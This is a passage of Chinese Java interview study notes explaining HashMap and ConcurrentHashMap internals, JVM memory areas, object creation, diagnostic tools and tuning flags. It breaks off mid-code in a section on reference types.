<h4 id="HashMap为什么不序列化table"><a href="#HashMap为什么不序列化table" class="headerlink" title="HashMap为什么不序列化table?"></a>HashMap为什么不序列化table?</h4><p>桶数组被transient修饰,HashMap 并没有使用默认的序列化机制，而是通过实现readObject&#x2F;writeObject两个方法自定义了序列化的内容。这样做是有原因的，HashMap 中存储的内容是键值对。所以只要我们把键值对序列化了，我们就可以根据键值对数据重建 HashMap。有的朋友可能会想，序列化 table 不是可以一步到位，后面直接还原不就行了吗？这样一想，倒也是合理。但序列化 talbe 存在着两个问题：</p>
<ol>
<li>table 多数情况下是无法被存满的，序列化未使用的部分，浪费空间</li>
<li>同一个键值对在不同 JVM 下，所处的桶位置可能是不同的，在不同的 JVM 下反序列化 table 可能会发生错误。</li>
</ol>
<p>HashMap 的get&#x2F;put&#x2F;remove等方法第一步就是根据 hash找到键所在的桶位置，但如果键没有覆写 hashCode 方法，计算hash 时最终调用 Object 中的 hashCode 方法。但Object 中的hashCode方法是native 型的，不同的 JVM下，可能会有不同的实现，产生的 hash 可能也是不一样的。也就是说同一个键在不同平台下可能会产生不同的 hash，此时再对在同一个 table 继续操作，就会出现问题。</p>
<h4 id="hashmap的长度为什么是2的幂次方"><a href="#hashmap的长度为什么是2的幂次方" class="headerlink" title="hashmap的长度为什么是2的幂次方"></a>hashmap的长度为什么是2的幂次方</h4><p>为了能让 HashMap 存取高效，尽量较少碰撞，也就是要尽量把数据分配均匀。我们上面也讲到了过了，Hash(需要扰动) 值的范围值-2147483648 到 2147483647，前后加起来大概 40 亿的映射空间，只要哈希函数映射得比较均匀松散，一般应用是很难出现碰撞的。但问题是一个 40 亿长度的数组，内存是放不下的。所以这个散列值是不能直接拿来用的。用之前还要先做对数组的长度取模运算，得到的余数才能用来要存放的位置也就是对应的数组下标。这个数组下标的计算方法是“ <code>(n - 1) &amp; hash</code>”。（n 代表数组长度）。这也就解释了 HashMap 的长度为什么是 2 的幂次方。</p>
<p>这个算法应该如何设计呢？</p>
<p>我们首先可能会想到采用%取余的操作来实现。但是，重点来了：“取余(%)操作中如果除数是 2 的幂次则等价于与其除数减一的与(&amp;)操作（也就是说 hash%length&#x3D;&#x3D;hash&amp;(length-1)的前提是 length 是 2 的 n 次方；）。” 并且 采用二进制位操作 &amp;，相对于%能够提高运算效率，这就解释了 HashMap 的长度为什么是 2 的幂次方。</p>
<h4 id="HashMap多线程操作导致死循环问题"><a href="#HashMap多线程操作导致死循环问题" class="headerlink" title="HashMap多线程操作导致死循环问题"></a>HashMap多线程操作导致死循环问题</h4><p>主要原因在于并发下的 Rehash 会造成元素之间会形成一个循环链表。不过，jdk 1.8 后解决了这个问题，但是还是不建议在多线程下使用 HashMap,因为多线程下使用 HashMap 还是会存在其他问题比如数据丢失。并发环境下推荐使用 ConcurrentHashMap 。</p>
<p>详情请查看：<a href="https://coolshell.cn/articles/9606.html">https://coolshell.cn/articles/9606.html</a></p>
<h4 id="Hash-Collision-Dos问题"><a href="#Hash-Collision-Dos问题" class="headerlink" title="Hash Collision Dos问题"></a>Hash Collision Dos问题</h4><p>这个安全弱点利用了各语言的Hash算法的“非随机性”可以制造出N多的value不一样，但是key一样数据，然后让你的Hash表成为一张单向链表，而导致你的整个网站或是程序的运行性能以级数下降（可以很轻松的让你的CPU升到100%）</p>
<h4 id="能否使用任何类作为-Map-的-key？"><a href="#能否使用任何类作为-Map-的-key？" class="headerlink" title="能否使用任何类作为 Map 的 key？"></a>能否使用任何类作为 Map 的 key？</h4><p>可以使用任何类作为 Map 的 key，然而在使用之前，需要考虑以下几点：  如果类重写了 equals() 方法，也应该重写 hashCode() 方法。类的所有实例需要遵循与 equals() 和 hashCode() 相关的规则。</p>
<p>如果一个类没有使用 equals()，不应该在 hashCode() 中使用它。</p>
<p>用户自定义 Key 类 佳实践是使之为不可变的，这样 hashCode() 值可以被缓存起来，拥有更好的性能。不可变的类也可以确保 hashCode() 和 equals() 在未来不会改变，这样就会解决与可变相关的问题了。</p>
<h4 id="在使用-HashMap-的时候，用-String-做-key-有什么好处？"><a href="#在使用-HashMap-的时候，用-String-做-key-有什么好处？" class="headerlink" title="在使用 HashMap 的时候，用 String 做 key 有什么好处？"></a>在使用 HashMap 的时候，用 String 做 key 有什么好处？</h4><p>HashMap 内部实现是通过 key 的 hashcode 来确定 value 的存储位置，因为字符串是不可变的，所以当创建字符串时，它的 hashcode 被缓存下来，不需要再次计算，所以相比于其他对象更快。</p>
<p>String、Integer等包装类的特性能够保证Hash值的不可更改性和计算准确性，能够有效的减少Hash碰撞的几率</p>
<ol>
<li>都是final类型，即不可变性，保证key的不可更改性，不会存在获取 hash值不同的情况</li>
</ol>
<p>内部已重写了equals()、hashCode()等方法，遵守了HashMap内部的规范（不清楚可以去上面看看putValue的过程），不容易出现Hash值计算错误的情况</p>
<h4 id="如果使用Object作为HashMap的Key，应该怎么办呢？"><a href="#如果使用Object作为HashMap的Key，应该怎么办呢？" class="headerlink" title="如果使用Object作为HashMap的Key，应该怎么办呢？"></a>如果使用Object作为HashMap的Key，应该怎么办呢？</h4><p>答：重写hashCode()和equals()方法</p>
<ol>
<li><p>重写hashCode()是因为需要计算存储数据的存储位置，需要注意不要试图从散列码计算中排除掉一个对象的关键部分来提高性能，这样虽然能更快但可能会导致更多的Hash碰撞；</p>
</li>
<li><p>重写equals()方法，需要遵守自反性、对称性、传递性、一致性以及对于任何非null的引用值x，x.equals(null)必须返回false的这几个特性，目的是为了保证key在哈希表中的唯一性</p>
</li>
</ol>
<h4 id="HashMap为什么不直接使用hashCode-处理后的哈希-值直接作为table的下标？"><a href="#HashMap为什么不直接使用hashCode-处理后的哈希-值直接作为table的下标？" class="headerlink" title="HashMap为什么不直接使用hashCode()处理后的哈希 值直接作为table的下标？"></a>HashMap为什么不直接使用hashCode()处理后的哈希 值直接作为table的下标？</h4><p>答：hashCode()方法返回的是int整数类型，其范围为-(2 ^ 31)<del>(2 ^ 31 - 1)，约有40亿个映射空间，而HashMap的容量范围是在16（初始化默认值）</del>2 ^ 30，HashMap通常情况下是取不到大值的，并且设备上也难以提供这么多的存储空间，从而导致通过hashCode()计算出的哈希值可能不在数组大小范围内，进而无法匹配存储位置；</p>
<ol>
<li><p>HashMap自己实现了自己的hash()方法，通过两次扰动使得它自己的哈希值高低位自行进行异或运算，降低哈希碰撞概率也使得数据分布更平均；</p>
</li>
<li><p>在保证数组长度为2的幂次方的时候，使用hash()运算之后的值与运算（&amp;）（数组长度 - 1）来获取数组下标的方式进行存储，这样一来是比取余操作更加有效率，二来也是因为只有当数组长度为2的幂次方时，h&amp;(length-1)才等价于h%length，三来解决了“哈希值与数组大小范围不匹配”的问题</p>
</li>
</ol>
<h4 id="HashMap-putVal"><a href="#HashMap-putVal" class="headerlink" title="HashMap putVal"></a>HashMap putVal</h4><p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211848502.png" alt="image-20210502162723163"></p>
<h4 id="解决hash冲突问题"><a href="#解决hash冲突问题" class="headerlink" title="解决hash冲突问题"></a>解决hash冲突问题</h4><p>拉链法; 使用两次扰动函数(hash函数); 引入红黑树;</p>
<p>所以我们如果只是单纯的用hashCode取余来获取对应的bucket这将会大大增加哈希碰撞的概率，并且最坏情况下还会将HashMap变成一个单链表，所以我们还需要对hashCode作一定的优化 hash()函数</p>
<p>上面提到的问题，主要是因为如果使用hashCode取余，那么相当于参与运算的只有hashCode的低位，高位是没有起到任何作用的，所以我们的思路就是让 hashCode取值出的高位也参与运算，进一步降低hash碰撞的概率，使得数据分布更平均，我们把这样的操作称为扰动，在JDK 1.8中的hash()函数如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1	static final int hash(Object key) &#123;</span><br><span class="line">2	int h;</span><br><span class="line">3	return (key == null) ? 0 : (h = key.hashCode()) ^ (h &gt;&gt;&gt; 16);// 与自己右移16位进行异或运算（高低位异或）</span><br><span class="line">4	&#125;</span><br></pre></td></tr></table></figure>

<p>这比在JDK 1.7中，更为简洁，相比在1.7中的4次位运算，5次异或运算（9次扰动），在1.8中，只进行了1次位运算和1次异或运算（2次扰动）；</p>
<h3 id="ConcurrentHashMap"><a href="#ConcurrentHashMap" class="headerlink" title="ConcurrentHashMap"></a>ConcurrentHashMap</h3><p>Jdk1.7 分段数组+链表, jdk1.8 数组+链表&#x2F;红黑树; jdk1.7 采用分段锁,每把锁只锁一部分数据;</p>
<p>jdk 1.8 采用 CAS 和 synchronized 来保证并发安全;synchronized 只锁定当前链表或红黑二叉树的首节点，这样只要 hash 不冲突，就不会产生并发，效率又提升 N 倍;ConcurrentHashMap 的初始化是通过自旋和 CAS 操作完成的;</p>
<p>建值对不能为空;</p>
<p>建议根据需求给初始容量,以防后期扩容很耗时,给32的话实际是64;</p>
<p>sizeCtl:</p>
<ol>
<li>-1 说明正在初始化</li>
<li>-N 说明有N-1个线程正在进行扩容</li>
<li>表示 table 初始化大小，如果 table 没有初始化</li>
<li>表示 table 容量，如果 table　已经初始化。</li>
</ol>
<p>put源码:</p>
<ol>
<li>根据 key 计算出 hashcode 。</li>
<li>判断是否需要进行初始化。</li>
<li>即为当前 key 定位出的 Node，如果为空表示当前位置可以写入数据，利用 CAS 尝试写入，失败则自旋保证成功。</li>
<li>如果当前位置的 <code>hashcode == MOVED == -1</code>,则需要进行扩容。</li>
<li>如果都不满足，则利用 synchronized 锁写入数据。</li>
<li>如果数量大于 <code>TREEIFY_THRESHOLD</code> 则要转换为红黑树。</li>
</ol>
<p>get源码:</p>
<ol>
<li>根据 hash 值计算位置。</li>
<li>查找到指定位置，如果头节点就是要找的，直接返回它的 value.</li>
<li>如果头节点 hash 值小于 0 ，说明正在扩容或者是红黑树，查找之。</li>
<li>如果是链表，遍历查找之。</li>
</ol>
<p>插入元素过程：</p>
<p>如果相应位置的Node还没有初始化，则调用CAS插入相应的数据；</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1	else if ((f = tabAt(tab, i = (n ‐ 1) &amp; hash)) == null) &#123;</span><br><span class="line">2	if (casTabAt(tab, i, null, new Node&lt;K,V&gt;(hash, key, value, null)))</span><br><span class="line">3	break; // no lock when adding to empty bin</span><br><span class="line">4	&#125;</span><br></pre></td></tr></table></figure>

<p>如果相应位置的Node不为空，且当前该节点不处于移动状态，则对该节点加</p>
<p>synchronized锁，如果该节点的hash不小于0，则遍历链表更新节点或插入新节点；</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1 if (fh &gt;= 0) &#123; </span><br><span class="line">2 binCount = 1;</span><br><span class="line">3	for (Node&lt;K,V&gt; e = f;; ++binCount) &#123;</span><br><span class="line">4	K ek;</span><br><span class="line">5	if (e.hash == hash &amp;&amp;</span><br><span class="line">6	((ek = e.key) == key ||</span><br><span class="line">7	(ek != null &amp;&amp; key.equals(ek)))) &#123;</span><br><span class="line">8	oldVal = e.val;</span><br><span class="line">9	if (!onlyIfAbsent)</span><br><span class="line">10	e.val = value;</span><br><span class="line">11	break;</span><br><span class="line">12	&#125;</span><br><span class="line">13	Node&lt;K,V&gt; pred = e;</span><br><span class="line">14	if ((e = e.next) == null) &#123;</span><br><span class="line">15	pred.next = new Node&lt;K,V&gt;(hash, key, value, null);</span><br><span class="line">16	break;</span><br><span class="line">17	&#125;</span><br><span class="line">18	&#125;</span><br><span class="line">19	&#125;</span><br></pre></td></tr></table></figure>

<p>\1.    如果该节点是TreeBin类型的节点，说明是红黑树结构，则通过 putTreeVal方法往红黑树中插入节点；如果binCount不为0，说明put操作对数据产生了影响，如果当前链表的个数达到8个，则通过treeifyBin方法转化为红黑树，如果oldVal不为空，说明是一次更新操作，没有对元素个数产生影响，则直接返回旧值；</p>
<p>\2.    如果插入的是一个新节点，则执行addCount()方法尝试更新元素个数 baseCount；</p>
<h3 id="HashTable"><a href="#HashTable" class="headerlink" title="HashTable"></a>HashTable</h3><p>默认11, 扩容2n+ 1;线程安全,所有方法都用sychronized修饰;不允许null键和值;没有转红黑树的机制;如使用 put 添加元素，另一个线程不能使用 put 添加元素, 也不能使用 get;</p>
<h3 id="Properties"><a href="#Properties" class="headerlink" title="Properties"></a>Properties</h3><p>用于获取配置文件值,key-value形式</p>
<h3 id="TreeMap"><a href="#TreeMap" class="headerlink" title="TreeMap"></a>TreeMap</h3><p>相比于HashMap来说 TreeMap 主要多了对集合中的元素根据键排序的能力以及对集合内元素的搜索的能力。</p>
<h3 id="LinkedHashMap"><a href="#LinkedHashMap" class="headerlink" title="LinkedHashMap"></a>LinkedHashMap</h3><p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211848696.jpg" alt="LinkedHashMap源码详细分析（JDK1.8）_"></p>
<h3 id="如何决定使用-HashMap-还是TreeMap？"><a href="#如何决定使用-HashMap-还是TreeMap？" class="headerlink" title="如何决定使用 HashMap 还是TreeMap？"></a>如何决定使用 HashMap 还是TreeMap？</h3><p>对于在Map中插入、删除和定位元素这类操作，HashMap是好的选择。然而，假如你需要对一个有序的key集合进行遍历，TreeMap是更好的选择。基于你的collection的大小，也许向HashMap中添加元素会更快，将map换为TreeMap进行有序key的遍历</p>
<h3 id="Array-和-ArrayList-有何区别？"><a href="#Array-和-ArrayList-有何区别？" class="headerlink" title="Array 和 ArrayList 有何区别？"></a>Array 和 ArrayList 有何区别？</h3><ul>
<li>Array 可以存储基本数据类型和对象，ArrayList 只能存储对象。</li>
<li>Array 是指定固定大小的，而 ArrayList 大小是自动扩展的。</li>
<li>Array 内置方法没有 ArrayList 多，比如 addAll、removeAll、iteration 等方法只有 ArrayList 有。</li>
</ul>
<p>对于基本类型数据，集合使用自动装箱来减少编码工作量。但是，当处理固定大小的基本数据类型的时候，这种方式相对比较慢。</p>
<h3 id="如何实现-Array-和-List-之间的转换？"><a href="#如何实现-Array-和-List-之间的转换？" class="headerlink" title="如何实现 Array 和 List 之间的转换？"></a>如何实现 Array 和 List 之间的转换？</h3><ul>
<li>Array 转 List： Arrays. asList(array) ；</li>
<li>List 转 Array：List 的 toArray() 方法。</li>
</ul>
<h3 id="comparable-和-comparator的区别？"><a href="#comparable-和-comparator的区别？" class="headerlink" title="comparable 和 comparator的区别？"></a>comparable 和 comparator的区别？</h3><ul>
<li>comparable接口实际上是出自java.lang包，它有一个 compareTo(Object obj)方法用来排序</li>
<li>comparator接口实际上是出自 java.util 包，它有一个compare(Object obj1, Object obj2)方法用来排序</li>
</ul>
<p>一般我们需要对一个集合使用自定义排序时，我们就要重写compareTo方法或 compare方法，当我们需要对某一个集合实现两种排序方式，比如一个song对象中的歌名和歌手名分别采用一种排序方法的话，我们可以重写compareTo方法和使用自制的Comparator方法或者以两个Comparator来实现歌名排序和歌星名排序，第二种代表我们只能使用两个参数版的Collections.sort().</p>
<h3 id="Collection-和-Collections-有什么区别？"><a href="#Collection-和-Collections-有什么区别？" class="headerlink" title="Collection 和 Collections 有什么区别？"></a>Collection 和 Collections 有什么区别？</h3><ul>
<li>java.util.Collection 是一个集合接口（集合类的一个顶级接口）。它提供了对集合对象进行基本操作的通用接口方法。Collection接口在Java 类库中有很多具体的实现。Collection接口的意义是为各种具体的集合提供了 大化的统一操作方式，其直接继承接口有List与Set。</li>
<li>Collections则是集合类的一个工具类&#x2F;帮助类，其中提供了一系列静态方法，用于对集合中元素进行排序、搜索以及线程安全等各种操作。</li>
</ul>
<h3 id="TreeMap-和-TreeSet-在排序时如何比较元素？-Collections-工具类中的-sort-方法如何比较元素？"><a href="#TreeMap-和-TreeSet-在排序时如何比较元素？-Collections-工具类中的-sort-方法如何比较元素？" class="headerlink" title="TreeMap 和 TreeSet 在排序时如何比较元素？ Collections 工具类中的 sort()方法如何比较元素？"></a>TreeMap 和 TreeSet 在排序时如何比较元素？ Collections 工具类中的 sort()方法如何比较元素？</h3><p>TreeSet 要求存放的对象所属的类必须实现 Comparable 接口，该接口提供了比较元素的 compareTo()方法，当插入元素时会回调该方法比较元素的大小。</p>
<p>TreeMap 要求存放的键值对映射的键必须实现 Comparable 接口从而根据键对元素进行排序。</p>
<p>Collections 工具类的 sort 方法有两种重载的形式，</p>
<p>第一种要求传入的待排序容器中存放的对象比较实现 Comparable 接口以实现元素的比较；</p>
<p>第二种不强制性的要求容器中的元素必须可比较，但是要求传入第二个参数，参数是Comparator 接口的子类型（需要重写 compare 方法实现元素的比较），相当于一个临时定义的排序规则，其实就是通过接口注入比较元素大小的算法，也是对回调模式的应用（Java 中对函数式编程的支持）。</p>
<h1 id="JVM"><a href="#JVM" class="headerlink" title="JVM"></a>JVM</h1><p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211848716.png" alt="image-20210508171931448"></p>
<h2 id="运行时数据区域"><a href="#运行时数据区域" class="headerlink" title="运行时数据区域"></a>运行时数据区域</h2><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211848702.png" alt="JVM运行时数据区域" style="zoom:80%;" />

<img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211848700.png" alt="Java运行时数据区域JDK1.8" style="zoom:80%;" />



<h3 id="堆"><a href="#堆" class="headerlink" title="堆"></a>堆</h3><p>jdk 7 新生代,老年代,永久代;jdk8 永久代被移除,用元空间代替,元空间使用的是直接内存;对象初始年龄为1,到了15会去老年代;</p>
<p>OutOfMemoryError: GC Overhead Limit Exceeded ： 当JVM花太多时间执行垃圾回收并且只能回收很少的堆空间时，就会发生此错误;</p>
<p>java.lang.OutOfMemoryError: Java heap space :假如在创建新的对象时, 堆内存中的空间不足以存放新创建的对象, 就会引发java.lang.OutOfMemoryError: Java heap space 错误。(和本机物理内存无关，和你配置的内存大小有关！)</p>
<h3 id="方法区"><a href="#方法区" class="headerlink" title="方法区"></a>方法区</h3><p>为永久代;线程共享;存储已被虚拟机加载的类信息、常量、静态变量、即时编译器编译后的代码等数据; 方法区和永久代的关系很像 Java 中接口和类的关系，类实现了接口，而永久代就是 HotSpot 虚拟机对虚拟机规范中方法区的一种实现方式;</p>
<h4 id="为什么要将永久代-PermGen-替换为元空间-MetaSpace"><a href="#为什么要将永久代-PermGen-替换为元空间-MetaSpace" class="headerlink" title="为什么要将永久代(PermGen)替换为元空间(MetaSpace)?"></a>为什么要将永久代(PermGen)替换为元空间(MetaSpace)?</h4><p>整个永久代有一个 JVM 本身设置固定大小上限，无法进行调整，而元空间使用的是直接内存，受本机可用内存的限制，虽然元空间仍旧可能溢出，但是比原来出现的几率会更小; java.lang.OutOfMemoryError: MetaSpace; 元空间里面存放的是类的元数据，这样加载多少类的元数据就不由 MaxPermSize 控制了, 而由系统的实际可用空间来控制，这样能加载的类就更多了; 在 JDK8，合并 HotSpot 和 JRockit 的代码时, JRockit 从来没有一个叫永久代的东西, 合并之后就没有必要额外的设置这么一个永久代的地方了。</p>
<h3 id="运行时常量池"><a href="#运行时常量池" class="headerlink" title="运行时常量池"></a>运行时常量池</h3><p>运行时常量池是方法区的一部分;JDK1.7之前运行时常量池逻辑包含字符串常量池存放在方法区, 此时hotspot虚拟机对方法区的实现为永久代; JDK1.7 字符串常量池被从方法区拿到了堆中, 这里没有提到运行时常量池,也就是说字符串常量池被单独拿到堆,运行时常量池剩下的东西还在方法区, 也就是hotspot中的永久代 <strong>; JDK1.8 hotspot移除了永久代用元空间(Metaspace)取而代之, 这时候字符串常量池还在堆, 运行时常量池还在方法区, 只不过方法区的实现从永久代变成了元空间(Metaspace);</strong></p>
<h4 id="JVM-常量池中存储的是对象还是引用呢？"><a href="#JVM-常量池中存储的是对象还是引用呢？" class="headerlink" title="JVM 常量池中存储的是对象还是引用呢？"></a>JVM 常量池中存储的是对象还是引用呢？</h4><p>如果是runtime constant pool（而不是interned string pool &#x2F; StringTable之类的其他东西）的话，其中的引用类型常量（例如CONSTANT_String、CONSTANT_Class、CONSTANT_MethodHandle、CONSTANT_MethodType之类）都存的是引用，实际的对象还是存在Java heap上的。</p>
<h2 id="对象的创建"><a href="#对象的创建" class="headerlink" title="对象的创建"></a>对象的创建</h2><p>类加载检查: 虚拟机遇到一条 new 指令时，首先将去检查这个指令的参数是否能在常量池中定位到这个类的符号引用，并且检查这个符号引用代表的类是否已被加载过、解析和初始化过。如果没有，那必须先执行相应的类加载过程。</p>
<p>分配内存: 指针碰撞:内存规整的情况下,GC收集器Serial,Parnew;空闲列表:堆内存不规整的情况下,CMS; 多线程下用CAS+失败重试;TLAB,为每一个线程预先在 Eden 区分配一块儿内存，JVM 在给线程中的对象分配内存时，首先在 TLAB 分配，当对象大于 TLAB 中的剩余内存或 TLAB 的内存已用尽时，再采用上述的 CAS 进行内存分配;</p>
<p>初始化零值:内存分配完成后，虚拟机需要将分配到的内存空间都初始化为零值（不包括对象头），这一步操作保证了对象的实例字段在 Java 代码中可以不赋初始值就直接使用，程序能访问到这些字段的数据类型所对应的零值。</p>
<p>设置对象头:初始化零值完成之后，虚拟机要对对象进行必要的设置，例如这个对象是哪个类的实例、如何才能找到类的元数据信息、对象的哈希码、对象的 GC 分代年龄等信息。 这些信息存放在对象头中。 另外，根据虚拟机当前运行状态的不同，如是否启用偏向锁等，对象头会有不同的设置方式。</p>
<p>执行init方法: 在上面工作都完成之后，从虚拟机的视角来看，一个新的对象已经产生了，但从 Java 程序的视角来看，对象创建才刚开始，<init>方法还没有执行，所有的字段都还为零。所以一般来说，执行 new 指令之后会接着执行 <init> 方法，把对象按照程序员的意愿进行初始化，这样一个真正可用的对象才算完全产生出来。</p>
<h2 id="对象的访问定位"><a href="#对象的访问定位" class="headerlink" title="对象的访问定位"></a>对象的访问定位</h2><p>句柄和直接指针;使用句柄来访问的最大好处是 reference 中存储的是稳定的句柄地址，在对象被移动时只会改变句柄中的实例数据指针，而 reference 本身不需要修改。使用直接指针访问方式最大的好处就是速度快，它节省了一次指针定位的时间开销;</p>
<h2 id="JVM常用调优指令和参数"><a href="#JVM常用调优指令和参数" class="headerlink" title="JVM常用调优指令和参数"></a>JVM常用调优指令和参数</h2><p>1）jps命令用于查询正在运行的JVM进程</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211848707.png" alt="img"></p>
<p>2）jstat可以实时显示本地或远程JVM进程中类装载、内存、垃圾收集、JIT编译等数据</p>
<p>&#x2F;home&#x2F;tools&#x2F;jdk1.8.0_181&#x2F;bin&#x2F;jstat -gcutil 30386（java进程号） 2000</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211848739.png" alt="img"></p>
<p>3）jinfo用于查询当前运行这的JVM属性和参数的值<br>[java@xftest0 ~]$ jinfo 43934<br>Attaching to process ID 43934, please wait…<br>Debugger attached successfully.<br>Server compiler detected.<br>JVM version is 20.45-b01<br>Java System Properties:</p>
<p>java.runtime.name &#x3D; Java(TM) SE Runtime Environment<br>sun.boot.library.path &#x3D; &#x2F;usr&#x2F;java&#x2F;jdk1.6.0_45&#x2F;jre&#x2F;lib&#x2F;amd64<br>java.vm.version &#x3D; 20.45-b01<br>java.vm.vendor &#x3D; Sun Microsystems Inc.<br>java.vendor.url &#x3D; <a href="http://java.sun.com/">http://java.sun.com/</a><br>path.separator &#x3D; :<br>java.vm.name &#x3D; Java HotSpot(TM) 64-Bit Server VM<br>file.encoding.pkg &#x3D; sun.io<br>sun.java.launcher &#x3D; SUN_STANDARD<br>env &#x3D; dev<br>user.country &#x3D; US<br>sun.os.patch.level &#x3D; unknown<br>4）jmap用于显示当前Java堆和永久代的详细信息 </p>
<p>命令jmap是一个多功能的命令。它可以生成 java 程序的 dump 文件，生成dump的命令为：jmap -dump:live,format&#x3D;b,file&#x3D;文文件名(hprof后缀) <PID> 也可以查看堆内对象示例的统计信息、查看 ClassLoader 的信息以及 finalizer 队列。 </p>
<p>5）jstack用于生成当前JVM的所有线程快照，线程快照是虚拟机每一条线程正在执行的方法,目的是定位线程出现长时间停顿的原因。</p>
<p>6）top命令 通过top -Hp 23344可以查看该进程下各个线程的cpu使用情况；具体实操经验见：<a href="https://www.cnblogs.com/wuchanming/p/7766994.html">https://www.cnblogs.com/wuchanming/p/7766994.html</a></p>
<p>7）pidstat实时查看一个进程的CPU使用情况及上下文切换情况</p>
<p>8）vmstat查看总体的CPU使用情况 </p>
<pre><code>  sudo vmstat 2 3

    參数2表示每一个2秒显示一下结果，3表示显示结果的数目。

   cs列表示每秒上下文切换次数，us表示用户CPU时间。
</code></pre>
<ol start="9">
<li>jmap  -heap 29544 查看某一实例jvm配置</li>
</ol>
<p>二、JVM常见的调优参数包括：</p>
<p>-Xmx</p>
<p>　　指定java程序的最大堆内存, 使用java -Xmx5000M -version判断当前系统能分配的最大堆内存</p>
<p>-Xms</p>
<p>　　指定最小堆内存, 通常设置成跟最大堆内存一样，减少GC</p>
<p>-Xmn</p>
<p>　　设置年轻代大小。整个堆大小&#x3D;年轻代大小 + 年老代大小。所以增大年轻代后，将会减小年老代大小。此值对系统性能影响较大，Sun官方推荐配置为整个堆的3&#x2F;8。</p>
<p>-Xss</p>
<p>　　指定线程的最大栈空间, 此参数决定了java函数调用的深度, 值越大调用深度越深, 若值太小则容易出栈溢出错误(StackOverflowError)</p>
<p>-XX:PermSize</p>
<p>　　指定方法区(永久区)的初始值,默认是物理内存的1&#x2F;64， 在Java8永久区移除, 代之的是元数据区， 由-XX:MetaspaceSize指定</p>
<p>-XX:MaxPermSize</p>
<p>　　指定方法区的最大值, 默认是物理内存的1&#x2F;4,在java8中由-XX:MaxMetaspaceSize指定元数据区的大小</p>
<p>-XX:NewRatio&#x3D;n</p>
<p>　　年老代与年轻代的比值，-XX:NewRatio&#x3D;2, 表示年老代与年轻代的比值为2:1</p>
<p>-XX:SurvivorRatio&#x3D;n</p>
<p>　　Eden区与Survivor区的大小比值，-XX:SurvivorRatio&#x3D;8表示Eden区与Survivor区的大小比值是8:1:1，因为Survivor区有两个(from, to)</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">-XX:+PrintGCDetails // 打印gc信息</span><br><span class="line">-XX:BaisedLockingStartupDelay=0 // 偏向锁什么开启</span><br><span class="line">-XX:-UseBiasedLocking=<span class="literal">false</span> // 不使用偏向锁</span><br><span class="line"></span><br><span class="line">-XX:MaxTenuringThreshold=15; //主要是控制新生代需要经历多少次GC晋升到老年代中的最大阈值; Tenuring Threshold[ˈθreʃhəʊld]终身监禁的门槛</span><br><span class="line">-XX:MetaspaceSize=N //设置 Metaspace 的初始（和最小大小）</span><br><span class="line">-XX:MaxMetaspaceSize=N //设置 Metaspace 的最大大小</span><br><span class="line">-XX:SurvivorRatio=8 </span><br><span class="line">// 最大堆内存为20m, 最小堆内存为5m, 通常设置为和最大一样,减少GC</span><br><span class="line">-Xmx20m -Xms5m -XX:+HeapDumpOnOutOfMemoryError -XX:HeapDumpPath=你要输出的日志路径</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>Jprofiler</p>
<p>分析内存dump文件,快速定位内存泄漏</p>
<h2 id="垃圾回收"><a href="#垃圾回收" class="headerlink" title="垃圾回收"></a>垃圾回收</h2><p>大对象直接进入老年代;经过一次minor gc年龄加1,对象年龄到了15也会进去老年代;</p>
<h3 id="判断对象死亡"><a href="#判断对象死亡" class="headerlink" title="判断对象死亡"></a>判断对象死亡</h3><p>引用计数法:实现简单效率高;但是无法解决相互循环引用问题;</p>
<p>可达性分析算法: 这个算法的基本思想就是通过一系列的称为 <strong>“GC Roots”</strong> 的对象作为起点，从这些节点开始向下搜索，节点所走过的路径称为引用链，当一个对象到 GC Roots 没有任何引用链相连的话，则证明此对象是不可用的;可以解决循环引用问题;在多线程环境下，其他线程可能会更新已经访问过的对象中的引用，从而造成误报（将引用设置为null）或者漏报（将引用设置为未被访问过的对象）。误报并没有什么伤害，Java虚拟机至多损失了部分垃圾回收的机会。漏报则比较麻烦，因为垃圾回收器可能回收事实上仍被引用的对象内存。 一旦从原引用访问已经被回收了的对象，则很有可能会直接导致Java虚拟机崩溃。</p>
<p>即使在可达性分析法中不可达的对象，也并非是“非死不可”的，这时候它们暂时处于“缓刑阶段”，要真正宣告一个对象死亡，至少要经历两次标记过程；可达性分析法中不可达的对象被第一次标记并且进行一次筛选，筛选的条件是此对象是否有必要执行 finalize 方法。当对象没有覆盖 finalize 方法，或 finalize 方法已经被虚拟机调用过时，虚拟机将这两种情况视为没有必要执行。</p>
<p>被判定为需要执行的对象将会被放在一个队列中进行第二次标记，除非这个对象与引用链上的任何一个对象建立关联，否则就会被真的回收。</p>
<h4 id="介绍一下强引用、软引用、弱引用、虚引用的区别？"><a href="#介绍一下强引用、软引用、弱引用、虚引用的区别？" class="headerlink" title="介绍一下强引用、软引用、弱引用、虚引用的区别？"></a>介绍一下强引用、软引用、弱引用、虚引用的区别？</h4><p>强引用: 必不可少的生活用品,即使报OOM也不回收; </p>
<p>软引用: 可有可无的生活用品,内存够不回收,内存不够就回收; 适合做缓存;</p>
<p>弱引用: 可有可无的生活用品,但是只要垃圾回收器发现就会回收,不管内存够不够;  Thread LocalMap的key是弱引用;</p>
<p>虚引用: 形同虚设, 任何时候都会被回收; get()也拿不到; 管理直接内存(mmap);在回收的时候起一个通知的作用,被回收的时候放到队列里去, 然后JVM再去处理这个队列,可以通知OS去处理堆外内存;</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 强引用</span></span><br><span class="line"><span class="type">String</span> <span class="variable">strongReference</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">String</span>(<span class="string">&quot;abc&quot;</span>);</span><br><span class="line"><span class="comment">// 软引用</span></span><br><span class="line"><span class="type">String</span> <span class="variable">str</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">String</span>(<span 